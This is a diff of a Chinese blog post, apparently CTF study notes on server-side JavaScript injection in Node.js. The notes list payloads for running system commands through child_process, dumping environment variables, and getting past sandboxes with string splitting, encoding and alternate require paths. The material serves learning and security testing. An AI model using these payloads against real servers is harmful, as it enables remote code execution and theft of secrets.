@@ -13,7 +13,6 @@ authors:
 draft: false              # 设为 true 则为草稿
 slug: "ssji-learning"    # 随机URL字符串
 ---
-<meta name="referrer" content="no-referrer">
 
 # SSJI
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1757066293580-e10e422d-c185-4a09-a939-f08b87bb6ea7.png)
@@ -21,15 +20,13 @@ slug: "ssji-learning"    # 随机URL字符串
 ## SSJI-konw
 Server-side JavaScript code injection 服务器端 JavaScript 代码注入
 
-portswigger描述如下（[https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection）](https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection）)
+portswigger描述如下（[https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection](https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection)）
 
 _Server-side code injection vulnerabilities arise when an application incorporates user-controllable data into a string that is dynamically evaluated by a code interpreter. If the user data is not strictly validated, an attacker can use crafted input to modify the code to be executed, and inject arbitrary code that will be executed by the server._  
 _服务器端代码注入漏洞产生于应用程序将用户可控数据整合到由代码解释器动态执行的字符串中。如果用户数据未经严格验证，攻击者可利用精心构造的输入来修改待执行代码，并注入任意代码由服务器执行。_
 
 _Server-side code injection vulnerabilities are usually very serious and lead to complete compromise of the application's data and functionality, and often of the server that is hosting the application. It may also be possible to use the server as a platform for further attacks against other systems._  
 _服务器端代码注入漏洞通常非常严重，会导致应用程序的数据和功能完全被破坏，并且常常会影响到托管该应用程序的服务器。此外，还可能利用该服务器作为平台，对其他系统发起进一步攻击。_
-
-
 
  **JavaScript 里能动态执行代码的函数**，主要有四个
 
@@ -54,8 +51,6 @@ setTimeout(() => console.log("hi"), 1000)
 setTimeout("console.log('hi')", 1000)
 ```
 
-
-
 + Function
 
 `Function` 构造函数创建的代码运行在 **全局作用域**，不像 `eval` 那样能访问当前作用域的局部变量。
@@ -65,8 +60,6 @@ let f = Function('a','b','return a+b');
 console.log(f(1,2));
 ```
 
-
-
 + setInterval()
 
 周期性执行
@@ -74,10 +67,6 @@ console.log(f(1,2));
 ```plain
 setInterval(() => console.log("tick"), 2000) // 每 2 秒执行一次
 ```
-
-
-
-
 
 ## 恶意payload以及利用
 大概总览如下
@@ -93,10 +82,6 @@ setInterval(() => console.log("tick"), 2000) // 每 2 秒执行一次
 **命令执行**：`child_process.execSync('cat /flag').toString()`
 
 **网络外带**：`http.get/axios/fetch`（题中可能屏蔽或无网络）
-
-
-
-
 
 ### 执行命令函数
 Node.js 里直接能调用系统命令的主要函数都在 `child_process` 模块里
@@ -117,7 +102,6 @@ require('child_process').spawnSync
 | `spawn` | 异步 | ❌（默认） | 返回 ChildProcess 对象 | 流式处理大输出 |
 | `spawnSync` | 同步 | ❌（默认） | 返回结果对象 | 阻塞执行，输出可控 |
 
-
 我们操作过程中，主要就用`execSync`,一步就拿到内容
 
 具体例子
@@ -131,12 +115,6 @@ require('child_process').execSync('whoami').toString()
 -->
 Resbpple\bx336
 ```
-
-
-
-
-
-
 
 ### 获取上下文
 我们必须要去获得全局对象,
@@ -186,8 +164,6 @@ true.constructor("return this")()
 [].__proto__.constructor("return this")()
 ```
 
-
-
 一些最后的效果就是构造如下
 
 这里举两个路线
@@ -217,16 +193,6 @@ JSON.stringify(process.env, null, 2)
   .inspect(process.env, { depth: null })
 ```
 
-
-
-
-
-
-
-
-
-
-
 ### require替代
 我们常使用require引入模块执行我们需要的功能
 
@@ -238,8 +204,6 @@ require('child_process').exec('calc');
 >
 
 `process.mainModule.require` 等同于 `require()`
-
-
 
 或者
 
@@ -262,10 +226,6 @@ Module.createRequire(process.cwd() + "/")('fs')
 
 这样创建出来的新 require 可以像在项目根目录一样加载模块，不会受当前文件的 __dirname 影响
 
-
-
-
-
 ### 字符对象现身
 我们经常遇到的情况是,举个例子
 
@@ -275,11 +235,7 @@ process.env
 
 就是只显示`[object Object]`这些属性
 
-![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905163237299.png)
-
 我们想要的是具体内容而不是属性
-
-
 
 1. 直接转成json
 
@@ -287,17 +243,11 @@ process.env
 JSON.stringify(process.env)
 ```
 
-![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905162615581.png)
-
 有些时候比较多，可以换行显示
 
 ```javascript
 JSON.stringify(process.env,null,2)
 ```
-
-![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905162750321.png)
-
-
 
 2. 使用`util.inspect`美化
 
@@ -313,8 +263,6 @@ process.mainModule.require("util").inspect(process.env,{depth:null})
 (Function("return process"))().mainModule.require('util').inspect(process.env,{depth:null})
 ```
 
-
-
 3. 变成「env 文件」风格的纯文本
 
 这个
@@ -322,8 +270,6 @@ process.mainModule.require("util").inspect(process.env,{depth:null})
 ```javascript
 Object.entries(process.env).map(([k,v])=>k '=' v).join('')
 ```
-
-
 
 4. `console.dir`
 
@@ -333,12 +279,6 @@ Object.entries(process.env).map(([k,v])=>k '=' v).join('')
 console.dir(process.env, {depth:null})
 ```
 
-![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905164424716.png)
-
-
-
-
-
 5. `require('util').format()`
 
 跟刚刚那个`util.inspect` 相似,就是没有缩进，类似 `printf`，可以把对象格式化
@@ -346,10 +286,6 @@ console.dir(process.env, {depth:null})
 ```plain
 process.mainModule.require('util').format(process.env)
 ```
-
-![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905164650100.png)
-
-
 
 6. Buffer
 
@@ -361,10 +297,6 @@ Buffer.from(JSON.stringify(process.env)).toString()
 
 本质还是`JSON.stringify(process.env)` 转回来又转回去
 
-
-
-
-
 ### 沙箱绕过
 对于一些沙箱绕过的思路如下，跟其他的差不多
 
@@ -373,8 +305,6 @@ Buffer.from(JSON.stringify(process.env)).toString()
 ```javascript
 ({}).constructor("return this['pro'+'cess']['main'+'Module']['requ'+'ire']('fs')")
 ```
-
-
 
 + **编码**：`\x70\x72\x6f\x63\x65\x73\x73`（`process`）
 + **调用链转进**：不用 `require`，走 `Module.createRequire` / `module.constructor._load`
@@ -408,16 +338,10 @@ module.constructor   // => Module 类
 module.constructor._load   // => require 的底层实现
 ```
 
-
-
 + **无 **`mainModule`：新版本 Node 可直接 `require('module')`
 + **禁 **`require`** 标识符**：从 `process` 拿 `binding` 或“缓存”对象（题目相关、难度较高）
 + **模板引擎特性**：EJS `<%=` 任意表达式；Pug `-` 行内 JS；Handlebars 需找 helper/原型污染链
 + **表达式求值器**：如果只允许数字/运算符，试探是否能逃出（如逗号运算符、数组/对象字面量、函数字面量、三目、模板字符串）
-
-
-
-
 
 ## 具体案例
 ### **Breathtaking View  令人惊叹的景色**
@@ -426,8 +350,6 @@ module.constructor._load   // => require 的底层实现
 >
 
 一道 SSJI 的题目
-
-
 
 一个计算器界面
 
